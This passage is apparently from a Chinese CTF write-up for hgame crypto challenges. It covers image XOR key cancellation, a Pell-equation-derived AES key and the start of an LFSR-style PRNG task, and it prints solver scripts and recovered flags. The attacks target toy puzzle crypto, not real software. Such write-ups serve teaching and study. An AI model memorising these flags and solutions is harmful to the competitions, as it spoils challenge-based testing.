style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>目前我们得到的是Output 一共是21张图片 证明flag的长度是21</p><p>按照正常顺序 从C1到C21是每张图片多一个字符 假设flag为<code>hgame&#123;123456789abcde&#125;</code></p><p>则有：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>h</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>4</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>5</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>20</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">{</mo><mn>123456789</mn><mi>a</mi><mi>b</mi><mi>c</mi><mi>d</mi><mi>e</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>21</mn></msub><mo>=</mo><mi>h</mi><mi>g</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo stretchy="false">{</mo><mn>123456789</mn><mi>a</mi><mi>b</mi><mi>c</mi><mi>d</mi><mi>e</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">C_1=h\\C_2=hg\\C_3=hga\\C_4=hgam\\C_5=hgame\\...\\C_{20}=hgame\{123456789abcde\\C_{21}=hgame\{123456789abcde\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">{</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mopen">{</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord">4</span><span class="mord">5</span><span class="mord">6</span><span class="mord">7</span><span class="mord">8</span><span class="mord">9</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mclose">}</span></span></span></span></span></p><p>所以我们创建一个21*21的循环空间 让每一个Output都与其他Output做异或 这样K与K异或消失  只剩下C与C异或</p><p>因为图像的异或是逐个像素点 所以像素点相同的地方会直接消失</p><p>我们关注最后两组 当O20和O21异或 等价于 C20和C21异或</p><p>相同部分消失 则只剩下<code>&#125;</code></p><p>但是因为进程时间的操作 我们不知道O20和O21是哪个 但是只有<code>&#125;</code>的图片只能有两个</p><p>一个是O20与其他所有循环异或 直到O20^O21</p><p>一个是O21与其他所有循环异或 直到O21^O20</p><p>范围大大所以 这只要看一下这两个循环哪个能有结果即可</p><p>因为O21与其他异或的时候</p><p>与C20异或得到<code>&#125;</code></p><p>与C19异或得到<code>e&#125;</code></p><p>与C18异或得到<code>de&#125;</code></p><p>字符个数是确定的</p><p>所以我们就能从后往前恢复出flag啦！</p><hr><p>回到题目</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片文件夹路径</span></span><br><span class="line">folder_path = <span class="string">&quot;png_out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取文件夹中的所有图片文件</span></span><br><span class="line">image_files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(folder_path) <span class="keyword">if</span> file.endswith(<span class="string">&quot;.png&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#对图像进行异或 </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line"><span class="comment"># 读取第二个图片并执行异或操作</span></span><br><span class="line">        out1 = Image.<span class="built_in">open</span>(os.path.join(folder_path, image_files[i]))</span><br><span class="line">        out2 = Image.<span class="built_in">open</span>(os.path.join(folder_path, image_files[j]))</span><br><span class="line">        key_image = xor_images(out1, out2)</span><br><span class="line">        key_image.save(<span class="string">&quot;.\\keykey\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(count))</span><br><span class="line">        count += <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>result:</strong></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115137615.png" alt="image-20240201115137615"></p><p>这是异或的结果 锁定第73个 生成下标是（3,10） 确认的方法是66为空 是3与3异或</p><p>所以下标为3的图片可能是C20也可能是C21 生成范围是63-83这21张图</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115403401.png" alt="image-20240201115403401"></p><p>提取出来 根据字符个数得到后16个字符的生成过程</p><p>前6个为<code>hgame&#123;</code> 就不浪费时间了</p><p>如果上面这个推不出来</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240201115534999.png" alt="image-20240201115534999"></p><p>其实我们也能看到另一个 相当于下标（10,3）产生的结果 这个无法恢复</p><p>综上证明下标为3（也就是png_out的第4张图）的是C21 下标为10（也就是png_out的第11张图）的是C20</p><p>到此完结flag：<code>hgame&#123;1adf_17eb_803c&#125;</code></p><h4 id="ezmath">ezMath</h4><h5 id="考点：佩尔方程">考点：佩尔方程</h5><h5 id="解题：">解题：</h5><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,y,x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">KEY</span>):</span><br><span class="line">    cipher= AES.new(KEY,AES.MODE_ECB)</span><br><span class="line">    encrypted =cipher.encrypt(flag)</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag=pad(flag)</span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">enc=encrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br></pre></td></tr></table></figure><p>对佩尔方程求解 拿到AES的密钥key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">10000000</span></span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">114514</span> </span><br><span class="line">solve_pell(N)</span><br><span class="line"><span class="comment">#(3058389164815894335086675882217709431950420307140756009821362546111334285928768064662409120517323199,9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680)</span></span><br></pre></td></tr></table></figure><p><a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/index.html#%E4%BD%A9%E5%B0%94%E6%96%B9%E7%A8%8B-Pell%E6%96%B9%E7%A8%8B">reference</a></p><p>上面脚本就是注意一下numTry的值调一下即可</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random,string</span><br><span class="line"><span class="comment"># from secret import flag,y,x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">enc=<span class="string">b&quot;\xce\xf1\x94\x84\xe9m\x88\x04\xcb\x9ad\x9e\x08b\xbf\x8b\xd3\r\xe2\x81\x17g\x9c\xd7\x10\x19\x1a\xa6\xc3\x9d\xde\xe7\xe0h\xed/\x00\x95tz)1\\\t8:\xb1,U\xfe\xdec\xf2h\xab`\xe5&#x27;\x93\xf8\xde\xb2\x9a\x9a&quot;</span></span><br><span class="line"><span class="comment"># def encrypt(KEY):</span></span><br><span class="line"><span class="comment">#     cipher= AES.new(KEY,AES.MODE_ECB)</span></span><br><span class="line"><span class="comment">#     encrypted =cipher.encrypt(flag)</span></span><br><span class="line"><span class="comment">#     return encrypted</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">Key</span>):</span><br><span class="line">    cipher = AES.new(Key,AES.MODE_ECB)</span><br><span class="line">    decrypted = cipher.decrypt(enc)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"><span class="comment">#pell方程求解</span></span><br><span class="line">D = <span class="number">114514</span></span><br><span class="line"><span class="comment"># assert x**2 - D * y**2 == 1  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag=pad(flag)</span></span><br><span class="line">y = <span class="number">9037815138660369922198555785216162916412331641365948545459353586895717702576049626533527779108680</span></span><br><span class="line">key=pad(long_to_bytes(y))[:<span class="number">16</span>]</span><br><span class="line">m=decrypt(key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc=<span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#enc=b&#x27;hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="ezprng">ezPRNG</h4><h5 id="考点：prng-与运算-移位运算">考点：PRNG 与运算 移位运算</h5><h5 id="解题：">解题：</h5><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span>  <span class="comment">#与1相与 有1则1 否则全为0 作用是限制位数</span></span><br><span class="line">    <span class="comment"># print(bin(R), bin(nextR), R.bit_length(), R.bit_length())</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span>  <span class="comment">#nextbit就是i的所有值相异或  对当前R操作</span></span><br><span class="line">    nextbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        nextbit^=(i%<span class="number">2</span>)  <span class="comment">#取最后一位</span></span><br><span class="line">        i=i//<span class="number">2</span>  <span class="comment">#舍弃最后一位</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span>+R+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">R=R.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">Rlist=[<span class="built_in">int</span>(R[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]  <span class="comment">#8位一组 进行切割  一共四组</span></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line">output=[]</span><br><span class="line"><span class="comment">#对切割的四组进行加密</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R=Rlist[i]</span><br><span class="line">    out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span 